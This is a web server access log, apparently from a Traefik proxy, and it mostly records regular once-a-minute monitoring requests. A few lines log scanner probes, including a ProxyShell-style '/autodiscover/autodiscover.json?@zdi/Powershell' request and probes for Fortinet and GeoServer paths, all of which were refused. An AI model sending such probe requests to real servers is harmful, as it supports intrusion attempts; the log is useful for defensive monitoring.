167.71.120.76 - - [16/Dec/2023:12:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2252 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2253 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2254 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2255 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2256 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2257 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2258 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2259 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2260 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2261 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2262 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2263 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2264 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2265 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2266 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2267 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2268 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2269 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2270 "www@docker" "http://172.29.0.8:80" 1ms
91.92.250.248 - - [16/Dec/2023:12:53:16 +0000] "HEAD / HTTP/1.1" 404 19 "-" "-" 2271 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:12:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2272 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2273 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2274 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2275 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2276 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2277 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2278 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2279 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2280 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2281 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2282 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2283 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2284 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2285 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2286 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2287 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2288 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2289 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2290 "www@docker" "http://172.29.0.8:80" 1ms
167.94.138.52 - - [16/Dec/2023:13:02:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2291 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:13:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2292 "www@docker" "http://172.29.0.8:80" 0ms
167.94.138.52 - - [16/Dec/2023:13:02:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2293 "web-to-websecure@internal" "-" 0ms
167.94.138.52 - - [16/Dec/2023:13:02:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2294 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:13:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2295 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2296 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2297 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2298 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2299 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2300 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2301 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2302 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2303 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2304 "www@docker" "http://172.29.0.8:80" 0ms
68.69.186.30 - - [16/Dec/2023:13:08:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2305 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:13:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2306 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2307 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2308 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2309 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2310 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2311 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2312 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2313 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2314 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2315 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2316 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2317 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:13:14:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2318 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:13:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2319 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2320 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2321 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2322 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2323 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2324 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2325 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2326 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2327 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2328 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2329 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2330 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2331 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2332 "www@docker" "http://172.29.0.8:80" 0ms
185.91.127.66 - - [16/Dec/2023:13:20:57 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 2333 "web-to-websecure@internal" "-" 0ms
91.92.250.248 - - [16/Dec/2023:13:20:58 +0000] "HEAD / HTTP/1.1" 404 19 "-" "-" 2334 "-" "-" 0ms
198.199.116.29 - - [16/Dec/2023:13:21:08 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 2335 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:13:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2336 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2337 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2338 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2339 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2340 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2341 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2342 "www@docker" "http://172.29.0.8:80" 0ms
162.243.152.4 - - [16/Dec/2023:13:24:29 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 2343 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:13:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2344 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2345 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2346 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2347 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2348 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2349 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2350 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2351 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2352 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2353 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2354 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2355 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2356 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2357 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2358 "www@docker" "http://172.29.0.8:80" 0ms
185.91.127.66 - - [16/Dec/2023:13:32:21 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 2359 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:13:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2360 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2361 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2362 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2363 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2364 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2365 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2366 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2367 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2368 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2369 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2370 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2371 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2372 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2373 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2374 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2375 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2376 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2377 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2378 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2379 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2380 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2381 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2382 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2383 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2384 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2385 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2386 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2387 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2388 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2389 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2390 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2391 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2392 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2393 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2394 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2395 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2396 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2397 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2398 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2399 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2400 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2401 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2402 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:13:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2403 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2404 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2405 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2406 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2407 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2408 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2409 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:13:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2410 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2411 "www@docker" "http://172.29.0.8:80" 0ms
65.49.20.66 - - [16/Dec/2023:13:57:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2412 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:13:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2413 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2414 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:13:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2415 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:13:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2416 "www@docker" "http://172.29.0.8:80" 0ms
65.49.20.66 - - [16/Dec/2023:13:59:39 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2417 "-" "-" 0ms
65.49.20.66 - - [16/Dec/2023:13:59:47 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 2418 "-" "-" 0ms
65.49.20.66 - - [16/Dec/2023:13:59:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2419 "-" "-" 0ms
65.49.20.66 - - [16/Dec/2023:14:00:06 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 2420 "-" "-" 0ms
65.49.20.66 - - [16/Dec/2023:14:00:11 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 2421 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2422 "www@docker" "http://172.29.0.8:80" 0ms
65.49.20.66 - - [16/Dec/2023:14:00:25 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 2423 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:14:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2424 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2425 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2426 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2427 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2428 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2429 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2430 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2431 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2432 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2433 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2434 "www@docker" "http://172.29.0.8:80" 1ms
